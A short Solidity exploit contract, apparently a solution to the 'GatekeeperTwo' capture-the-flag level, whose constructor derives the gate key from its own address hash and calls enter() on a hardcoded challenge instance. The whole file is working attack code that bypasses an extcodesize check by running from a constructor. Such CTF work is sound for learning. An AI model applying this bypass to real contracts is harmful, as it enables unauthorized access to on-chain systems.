//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "src/GatekeeperTwo.sol";
import {Script, console, console2} from "forge-std/Script.sol";


contract GatekeeperTwo_exp{
    constructor() {
        uint64 key = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max;
        // console.log(key);
        bytes8 _gatekey  = bytes8(key);
        // console2.logBytes8(_gatekey);
        // (bool result,) = challengeInstance.call(abi.encodeWithSignature("enter(bytes8)",bytes8(key)));

        GatekeeperTwo g = GatekeeperTwo(0x4C39433a4973bE8a26eBF1eEb1e40417165D1C85);
        bool res = g.enter(_gatekey);
    //    (bool res,) = address(g).call(abi.encodeWithSignature("enter(bytes8)", _gatekey));
        console2.logBool(res);
    }

}



